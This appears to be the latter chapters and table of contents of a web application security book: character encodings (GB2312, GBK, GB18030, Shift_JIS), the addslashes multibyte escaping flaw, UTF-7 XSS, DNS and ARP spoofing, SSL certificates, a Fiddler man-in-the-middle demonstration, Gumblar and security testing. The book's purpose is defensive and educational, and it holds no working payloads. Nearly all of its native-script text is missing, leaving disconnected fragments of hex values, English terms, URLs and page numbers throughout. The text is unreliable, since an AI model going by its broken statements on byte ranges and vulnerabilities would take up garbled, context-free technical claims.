 PHP5.2  mb_check_encoding   UTF-8  5.3.0   PHP5.2  5.2.17   5.3 
GB2312
GB2312 "" 94  /  
0109 
1655 
5687  / 
8894 
 GB2312 " """
 0xA10xF7 0187  0xA0 0xA10xFE 16  0xB00xF7  0xA10xFE
"" GB2312  1618 0xA1   GB2312  0xB0B20xB0 = 0xA1 + 160xB2 = 0xA1 + 18

GB2312  EUC-JP  
<?php mb_internal_encoding("GB2312");  $p1 = strpos("  ", '  '); // int(1)
367

var_dump($p1);  $p2 = mb_strpos("  ", '  '); // bool(false) var_dump($p2);
"" 1618"" 1819"" 1920"" 16181920  1819 ""
 GB2312  int(1)  bool(false) 
 GB2312  EUC-JP  GB2312  mb_strpos 
 GB23122 
 Shift_JIS 
GBK
GBK  0x000x7F ASCII  
GBK  0x810xFE 0x40 0x7E 0x800xFE 0x81400xFE7E  0x8180 0xFEFE

 GBK 

 0x5C
 GB2312  PHP 
 PHP  addslashes  '"\ NULNULL 
 addslashes  \  ASCII  0x5C GBK  0xD527 0x27  0xD527  0xD55C0x27 0xD50x5C  GBK ""  ' SQL 
368

 UTF-8  GB18030 GB18030 GB18030    6-5GB18030 

1   2  
4  

0x000x7F

 1 

0x810xFE

 1  
0x81 0xFE

 2  
0x30 0x39

 2 

0x400x7E 0x800xFE

 3  

 4  

0x81 0xFE

0x30 0x39

 0x000x7F  ASCII 
 0x810xFE 0x400x7E  0x80 0xFE
 GB/T 11383  0x300x39   0x813081300xFE39FE39 0x810xFE 0x300x39
 GB18030  0x300x39   ASCII  ASCII  09  5C  
11 5  UTF-16   UTF-8

369

6.4
  3 
1.  2.  3. 
  UTF-8   XSS UTF-8   IIS MS00-05712  Tomcat  CVE-2008-293813  142001  Nimda  MS00-057     Bug "5C"  "5C" UTF-7  XSS     Unicode ""U+00A5 "\"  4.4  JVN#5974872315    12http://technet.microsoft.com/en-us/security/bulletin/ms00-057 13http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-2938 14Tomcat Security Team  Tomcat  JRE  15http://jvn.jp/jp/JVN59748723/index.html
370

6.5
 4     
 4  6-20 
 6-20 
    OS Unicode Web   Unicode 
 Unicode   Unicode  Unicode  
 16   Shift_JIS  17  ISO-2022-JP Unicode   Web 
371

 Web   6-21 HTTP  Shfit_JIS  UTF-8  UTF-16 
 6-21 Web    Shfit_JIS  UTF-8      UTF-8  Shift_JIS U+00A5 0x5C 6-21   
372

 Shfit_JIS  Shfit_JIS   18  U+00A5  Unicode   UTF-8  Shift_JIS  UTF-8 " "  6-22   
 6-22   ISO-2022-JP UTF-8   19  Unicode   ISO-2022-JP 
373

 ISO-2022-JP  MIME   ISO-2022-JP  


 4.2   
 Web Java  ASP.NETC#  VB.NET  Replacement CharacterU+FFFD Perl 5.8  decode  
PHP  4.2   mb_check_encoding 






Java.NET Perl 5.8  PHP  
 UTF-8 EUC-JP   php.ini  mbstring.internal_encoding   mbstring  

374

 PHP  mbstring   php.ini  mbstring.internal_encoding   htmlspecialchars  mbstring.internal_encoding  
 htmlspecialchars 
 PHP  htmlspecialchars   htmlspecialchars   htmlspecialchars  


 HTTP  Content-Type  4.3 
 4.4 


 HTTP  Content-Type 
 HTTP  Content-Type   UTF-7   XSS ""  20 
UTF-8
Shift_JIS Web 
EUC-JP

 


375


 Unicode  UTF-8  UTF-16
"" 21
 Unicode " "" " Unicode  """ " Shift_JIS  EUC-JP ""
""""U+9AB6 JIS X 0208 JIS  3  

  

 HTTP  PHPJavaPerl 
 Shfit_JIS  Unicode  U+00A5   Shfit_JIS  U+00A5  0x5C
 
 
16 Unicode----
17 UTF-8  2010  12  au/KDDI   Shift_JIS  UTF-8
18 U+00A5  Shift_JIS 
19 UTF-8  iPhone   UTF-8 
20UTF-8GB2312  GBK----
376

21---- 377

6.6
  Web     
 U+FFFD  """"""   Nimda  MS00-057  
 Unicode   
378

 7  Web 
  Web     Web  7-1 
379

 7-1 Web    100%  Web  
 Web  


7.1 Web 
 Web   Web  PHP  Servlet   Web 
7.1.1  Web Web   Web XSS 
 
7.1.2  Web TelnetFTPSSH  phpMyAdmin  Tomcat   

7.1.3  Web 



380

 
  Web   
 Web  Web  
  
   
   Support Lifecycle Policy  7  1  FLOSS  FLOSS    PHP PHP4.x  PHP5  3 
381

 7-2 PHP 
PHP   PHP  PHP FLOSS 
 FLOSS  Web   

 

Make
APT  Yum 
Windows Update  WSUS 
  
 PHP   
 Bug  
382

 Linux  Fedora     http://www.ituring.com.cn/book/1249apt-get  Ubuntu  Debian  Linux  APT  

Fedora  CentOSRed Hat Enterprise Linux  Linux  Yum   Linux    Web   Web  Web    2
JVNJapan Vulnerability Notes http://jvn.jp JVN iPedia  http://jvndb.jvn.jp/  RSS  RSS  
383

 
1.  2.  3.  4.     3 
          Web     Check List  Web    
384

    1http://www.microsoft.com/japan/presspass/detail.aspx?newsid=19322010  12  4  2 WooYunhttp://www.wooyun.org/ SecurityFocushttp://www.securityfocus.com/ National Vulnerability Databasehttp://nvd.nist.gov/----
 SSH sshd FTP   SSH  FTP  
 VPN   IP   IP   IP   OS Windows  iptablesTCP Wrapper  IP    TCP Wrapper  sshd  /etc/hosts.deny  /etc/hosts.allow   IP   IP   TCP Wrapper  sshd 
385

 IP  IP  IP  Web  ISP   ISP 
/var/log/secure SSH   IP  IP  
  7-3   Nmap3Windows  Linux  Nmap 
 7-3  SSHSMTPHTTPPOP3  4  4 SSH   PostgreSQL  Nmap   PostgreSQL 
386

 7-4  Windows Server 
 7-4    Web   5 3http://nmap.org/ 4443  HTTPS Nmap  HTTP 5   IP    Telnet  FTP  SSH   SSH   Telnet  FTP   TelnetFTPSSH 
387

 SSH / SSH  Telnet  
388

7.2
 Web   

7.2.1  
 DNS 
ARP 
 DNS   DNS 
 DNS  DNS 
DNS 

2010  11  Secunia http://secunia.com/  DNS  6  
6http://secunia.com/blog/153/2010  11  28
DNS  DNS  DNS   Web  IP   IP 
 DNS  7.2.3 
VISA 
"VISA "
 VISA.CO.JP  E-ONTAP.COM  EONTAP.COM  E-ONTAP.COM   VISA.CO.JP  E-ONTAP.COM  
389

 E-ONTAP.COM  VISA.CO.JP   
VISA   
ARP  ARP  ARPAddress Resolution Protocal IP  ARP  IP  MAC ARP  ARP  ARP 
2008  6  ARP   ARP  iframe  
 ARP  7.2.3 
7.2.2 Phishing  DNS  ARP   SNS  
  
7.2.3Web   Web 

 SSL/TLS


390

  7.2.1  ARP  DNS  

 ARP   
  ARP 
 DNS 
DNS  DNS   DNS  DNS  IPA DNSSEC
DNS  DNS  7
 DNS 
http://www.ipa.go.jp/security/vuln/20050627_dns.html
DNS  PDF 
http://www.ipa.go.jp/security/vuln/DNS_security.html
 DNS 
http://www.ipa.go.jp/security/vuln/documents/2008/200809_DNS.html
 DNS 
http://www.ipa.go.jp/security/vuln/documents/2008/200812_DNS.html
7 ""http://en.wikipedia.org/wiki/DNS_spoofing DNS http://www.chinacommunications.cn/fileup/PDF/2009-6-4003.pdf DNS http://www.freebuf.com/articles/network/17150.html----
 SSL/TLS SSLSecure Sockets Layer TLSTransport Layer Security Web 
391

 SSL SSL  Certification Authority  Web  SSL   SSL   SSL   Web   7-5  Internet Explorer 9   https://example.jp/ 
 7-5   
  EV-SSL   EV-SSL  CA/Browser Forum 
392

8  8http://www.cabforum.org/documents.html  EV-SSL  7-6  HTTPS  verisign   
 7-6EV-SSL   EV-SSL   EV-SSL   
   StartCom 9  StartCom  IEFirefoxGoogle ChromeSafariOpera   IE6   SSL 
393

 9http://www.startcom.org/    7-1







.CO.JP



.GO.JP



.LG.JP



.AC.JP.ED.JP

 1  1  
 Web  .COM 

394

7.3
 Web   SSL 
7.3.1  Web 

 12 WEP  34 

   HUB 

  HTTP  HTTP  Fiddler  
 DHCP 
 DHCP  DHCP  DNS   IP  IP  ARP   DNS  IP  DNS 
 ARP  DNS DNS cache poisoning
 ARP  DNS   
7.3.2  Man-In-ThMiddle AttackMITM
395


 7-7  7-7   HTTPS  HTTPS     Fiddler   Fiddler  Fiddler  Tools "Fiddler Options""HTTPS" "Capture HTTPS CONNECTs""Decrypt HTTPS traffic" 7-8 
 7-8 Fiddler  MITM   7-9 "No"
396

 7-9  HTTPS  Internet Explorer6IE6"""" HTTPS IE7 "" HTTPS   7-10  verisign 
 7-10 HTTPS  "" Fiddler  Fiddler  HTTP 
397

 7-11 HTTPS 

 SSLHTTPS

 Fiddler Web   

 Fiddler  7-9 "No" "Yes""Yes" Fiddler   Windwos MITM   Fiddler  IE  Fiddler  HTTPS 
 7-9 "No" SpywareSSL  
  Windows Update 
 CA  CA  CA  Blog "PKI 
398

3"9 9 .2005  2  5 .PKI  (3) PKI 3 . 2011  1  13  @ http://takagihiromitsu.jp/diary/20050205.html#p02 7.3.3  SSL    SSL 
 HTTPS  SSL   Cookie  secure  4.8.2   CSSJavaScript  HTTPS JavaScript  JavaScript  HTTP  HTTPS   7-12 
 7-12  frame  iframe  frame  HTTPS  HTTPS   frame HTTPS frame   frame  iframe HTTPS   " SSL 2.0"""  SSL2. 
399

 SSL2.0""  



 3   
SSL 
  HTML  
""  
  
 JavaScript   XSS   
 SSL 


[1]  . (2005  2  5  ). PKI 3 .2011  1  13   : http://takagi-hiromitsu.jp/diary/20050205.html#p02
400

7.4
 Web  
7.4.1 Web  Web  AWeb  B Web  ABA B  Web  OS  
     Web B  PC  10 10 PC  
7.4.2  11 7-13   45.2% 48.3%U   PC  48% 112009  http://www.ipa.go.jp/security/fy21/reports/isec-survey/
401

 7-13   Web  Web    Web   PC 
7.4.3Web  Web 
    USB   Web   PC   PC  Windows Update  
402

 7.4.4 Web 
 Web  4.12   Web  7.1   FTP  7.1   PC  PC  7.4.3   7.4.3   
 PDF  
Web        
  
 
403

         API    Windows Live SkyDrive12  13 12https://skydrive.live.com 13 eicar.com   http://www.eicar.org/86-0-Intended-use.html 
404

 7-14Web Windows Live SkyDrive Web  Gumblar   Gumblar  "Gumblar" Web  
Gumblar  FTP  
 SCP  SFTP  FTP  IP  PC  
 Gumblar  Gumblar  http://www.ipa.go.jp/security/txt/2010/02outline.html[1]
405

  [1] IPA.2010  2  3 . ·  [1  ]  [1  ].  2010  12  2  http://www.ipa.go.jp/security/txt/2010/02outline.html COLUMN END
406

7.5
 Web   Web     
 Web    " Web  "[1]
 [1]  .2007  3  23 .  .  2010  12  4  Web  Web  http://www.rcis.aist.go.jp/special/websafety2007/
407

 8  Web 
 Web  
8.1
  8-1    8-1 
 8-1
8.2
 
  
          
408

 Review                      
8.3
 
409

8.3.1 
  RFIRequest For Information  RFI  
8.3.2  RFPRequest For Proposal  RFP  RFP  RFP  
 Bug   RFP   Bug  RFP   Bug 








  1 [1] 

410

 50  """ " 2 
    RFP  RFI  1 Web   http://www.consumer.go.jp/kankeihourei/seizoubutsu/pl-j.html 2""
8.3.3  

   RFP   8-2
 8-2  8-2 
 5.15.3   5.4    7.1.3  
411

8.3.4    Bug   
  
 CSRF   HTTPS 
8.3.5   
8.3.6  Bug   
    3 3  Web  IBM  Rational AppScanHP  HP WebInspect software  4   Web 
412

4 WebScarab: https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project OpenVAS: http://www.openvas.org/index.html w3af: http://w3af.org/----  "Web "
8.3.7Web  Web LASDEC Web    LASDEC https://www.j-lis.go.jp/lasdec-archive/cms/12,23183,84.html  Web  Web 
 12    Fiddler      8-3  Web  SQL 
 8-3Web  Web   8-4  Web   Web Fiddler   
 8-4 Web 
8.3.8
413

  
    grep  5   5 SQL   OS     Web    
8.3.9     
  
414

   Web 
8.3.10 

  Web 

  5.4  iLogScanner6   6iLogScanner  SQL http://www.ipa.go.jp/security/vuln/iLogScanner/index.html  7.1  
  Web  

  7 7http://technet.microsoft.com/zhcn/security/ff852094
8.4
 Web    Web  RFP  Bug  
415

 [1]  .2007  4  13 .· ·2010  12  15  http://www.meti.go.jp/policy/it_policy/keiyaku/model_keiyakusyo.pdf
416





3



4



5



6

 1   Web 

7

1.1 " Bug"

7

1.2 

7

1.3 

10

1.4  Bug 

10

1.5 

10

 2  

12

2.1 

12

2.2  VMware Player

13

2.3 

16

2.4  Fiddler

21

 3  Web   HTTP 

25

3.1 HTTP 

25

3.2 

52

 4  Web 

63

4.1 Web 

63

4.2 

67

4.3 

82

4.3.1 

82

4.3.2 

99

4.3.3 

111

4.4 SQL 

113

4.4.1 SQL 

113

4.5 

133

4.5.1 CSRF

133

417

4.6 

150

4.6.1 

150

4.6.2  ID 

152

4.6.3  ID  URL

156

4.6.4  ID

163

4.7 

174

4.7.1 

174

4.7.2 HTTP 

181

4.7.3 

192

4.8 Cookie 

194

4.8.1 Cookie 

194

4.8.2 Cookie 

197

4.9 

208

4.9.1 

208

4.9.2 

209

4.10 

220

4.10.1 

220

4.10.2 

226

4.11  OS 

230

4.11.1 OS 

230

4.12 

244

4.12.1 

244

4.12.2 

247

4.12.3 

253

4.13 include 

268

4.13.1 

268

4.14 eval 

276

4.14.1 eval 

276

4.15 

284

4.15.1 

284

 5  

290

5.1 

290

5.1.1 

290

5.1.2 

297

418

5.1.3 

301

5.1.4 

310

5.1.5 

317

5.1.6 

318

5.1.7 

319

5.1.8 

321

5.2 

324

5.2.1 

324

5.2.2 

329

5.2.3 

331

5.2.4 

331

5.2.5 

335

5.2.6 

335

5.2.7 

335

5.3 

336

5.3.1 

336

5.3.2 

336

5.3.3 

340

5.3.4 

342

5.3.5 

342

5.4 

343

5.4.1 

343

5.4.2 

343

5.4.3 

344

5.4.4 

346

5.4.5 

347

 6  

348

6.1 

348

6.2 

350

6.3 

356

6.4 

370

6.5 

371

6.6 

378

 7   Web 

379

419

7.1  Web 

380

7.1.1 

380

7.1.2 

380

7.1.3 

380

7.2 

389

7.2.1 

389

7.2.2 

390

7.2.3 Web 

390

7.3 

395

7.3.1 

395

7.3.2 

395

7.3.3 

399

7.4 

401

7.4.1  Web 

401

7.4.2 

401

7.4.3 Web 

402

7.4.4 

403

7.5 

407

 8   Web 

408

8.1 

408

8.2 

408

8.3 

409

8.3.1 

410

8.3.2 

410

8.3.3 

411

8.3.4 

412

8.3.5 

412

8.3.6 

412

8.3.7 Web 

413

8.3.8 

413

8.3.9 

414

8.3.10 

415

8.4 

415

420

